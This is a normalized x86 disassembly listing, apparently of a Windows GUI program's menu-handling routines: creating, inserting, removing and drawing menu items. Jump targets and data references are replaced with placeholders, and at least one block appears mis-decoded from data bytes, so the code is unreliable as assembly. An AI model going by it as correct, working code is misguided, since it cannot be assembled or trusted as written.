mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_4547ac
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44f6d0
push ebx
mov ebx eax
mov eax ebx
call sub_44c254
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f700
push ebx
mov ebx eax
mov eax ebx
call sub_44c268
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f730
push ebx
mov ebx eax
mov eax ebx
call sub_44c290
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f760
push ebx
mov ebx eax
mov eax ebx
call sub_44c2b8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_404444
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f794
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44c27c
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f7d0
push ebx
mov ebx eax
mov eax ebx
call sub_44c2cc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f804
push ebx
mov ebx eax
mov eax ebx
call sub_44c2e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f838
push ebx
mov ebx eax
mov eax ebx
call sub_44c2f4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f86c
push ebx
mov ebx eax
mov eax ebx
call sub_41d988
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f894
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_44f8b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4518f4
sub_44f8d4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_451964
sub_44f8f4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4519b8
sub_44f914
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_44f930
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_40408c
sub_44f954
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_451ae4
sub_44f974
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_451ac0
sub_44f994
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_451ad4
sub_44f9b4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_44f9e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41d098
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_44f4cc
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4523f0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_44fa5c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_454590
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_451a8c
test eax eax
jg r-xdata
mov edx esi
call sub_451e24
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_451a9c
call sub_4032e8
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_4032e8
lea eax [ esi + 0x44 ]
call sub_40d18c
lea eax [ esi + 0x78 ]
call sub_40d18c
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_44fe78
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_417a44
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d0e4
test bl bl
jle r-xdata
call sub_4032e8
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_44fb10
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44fd6b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fd72
lea eax [ ebp - 0x40 ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_404038
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_4040d0
mov eax ebx
call sub_451a8c
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_450020
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404444
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_451a8c
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_452048
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_44f174
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4043b8
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4044f8
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_4044f8
push eax
mov eax ebx
call sub_450020
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403474
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_451664
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404444
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_4044f8
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_451a8c
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_450020
mov [ ebp - 0x25 ] eax
sub_44fd8b
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_44fb10
xor eax eax
pop ebp
retn
sub_44fdb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_453684
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45264c
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_452b48
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_44f54c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_44fe20
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44fe6a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41c1c8
mov eax [ ebp - 0x4 ]
call sub_44f3d4
mov edx eax
mov eax ebx
call sub_451ac0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fe71
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_44fe78
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_44fef0
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_41d168
sub_44feb4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41d4e8
mov eax ebx
call sub_451a74
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_451a74
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4034e4
pop esi
pop ebx
retn
mov eax ebx
call sub_44fef0
sub_44fef0
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_450020
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_44fef0
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_450020
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_450020
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_44fdb0
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax ebp
call sub_450020
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44ffc0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_451a8c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_451a9c
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_451a9c
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_451a9c
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_44f0c8
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_450020
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_44fdb0
mov eax [ rw-data ]
call sub_44f0c8
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_45006c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41d410
push ebx
push sub_44fe20
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_4500b0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_450294
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_452048
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4040d0
test bh 0x4
je r-xdata
mov eax edi
call sub_453684
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404444
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_420d54
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404300
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_42072c
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_420738
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45029b
lea eax [ ebp - 0xc ]
call sub_404038
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_42146c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4042f8
push eax
mov eax [ ebp - 0xc ]
call sub_4044f8
push eax
mov eax [ ebp - 0x4 ]
call sub_42146c
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_42046c
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4042f8
push eax
mov eax [ ebp - 0xc ]
call sub_4044f8
push eax
mov eax [ ebp - 0x4 ]
call sub_42146c
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_42046c
mov eax 0xff00000d
call sub_41ffac
mov esi eax
mov eax 0xff000010
call sub_41ffac
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_42046c
jmp r-xdata
sub_450300
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_450be8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_421010
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_420c38
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_42046c
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404444
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_420c38
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_421010
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d0c4
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42146c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_420c30
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
